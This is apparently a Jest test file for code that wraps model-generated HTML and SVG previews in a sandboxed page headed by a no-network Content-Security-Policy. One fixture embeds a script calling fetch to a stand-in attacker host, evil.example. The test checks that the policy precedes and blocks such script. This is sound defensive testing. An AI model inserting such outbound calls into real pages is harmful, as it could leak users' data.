/**
 * The preview document: the CSP meta must be the FIRST thing in <head>, before any model text (a CSP meta binds only
 * what follows it and is ignored outside <head>), and only html / svg get a document at all.
 */
import { PREVIEW_CSP, PREVIEW_SANDBOX, buildPreviewDocument } from './previewDocument';

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;

describe('previewDocument', () => {
  it('the sandbox is exactly allow-scripts, and the CSP is the spec\'d no-network policy', () => {
    expect(PREVIEW_SANDBOX).toBe('allow-scripts');
    expect(PREVIEW_CSP).toBe(
      "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: https:; font-src data: https:; media-src data: https:; connect-src 'none'",
    );
  });

  it('html: the CSP meta opens <head>, before the model\'s markup', () => {
    const page = '<!DOCTYPE html><html lang="ka"><head><title>T</title><script>fetch("https://evil.example")</script></head><body>x</body></html>';
    const doc = buildPreviewDocument('html', page)!;
    expect(doc.startsWith(`<!doctype html><html><head>${CSP_META}`)).toBe(true);
    expect(doc.indexOf(CSP_META)).toBeLessThan(doc.indexOf('<script>'));
    expect(doc.endsWith(page)).toBe(true); // the page itself is not rewritten
  });

  it('the parser puts the CSP meta inside <head> for a full page and for a bare fragment', () => {
    for (const code of ['<!DOCTYPE html><html><head><style>p{}</style></head><body><p>hi</p></body></html>', '<p>hi</p><script>1</script>']) {
      const parsed = new DOMParser().parseFromString(buildPreviewDocument('html', code)!, 'text/html');
      const first = parsed.head.firstElementChild!;
      expect(first.getAttribute('http-equiv')).toBe('Content-Security-Policy');
      expect(first.getAttribute('content')).toBe(PREVIEW_CSP);
      expect(parsed.body.querySelector('p')?.textContent).toBe('hi');
    }
  });

  it('svg: wrapped in a page whose head starts with the CSP meta', () => {
    const doc = buildPreviewDocument('svg', '<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>')!;
    const parsed = new DOMParser().parseFromString(doc, 'text/html');
    expect(parsed.head.firstElementChild?.getAttribute('content')).toBe(PREVIEW_CSP);
    expect(parsed.body.querySelector('svg circle')).toBeTruthy();
  });

  it('every other language has no preview document', () => {
    expect(buildPreviewDocument('javascript', 'alert(1)')).toBeNull();
    expect(buildPreviewDocument('python', 'print(1)')).toBeNull();
    expect(buildPreviewDocument('xml', '<a/>')).toBeNull();
  });
});
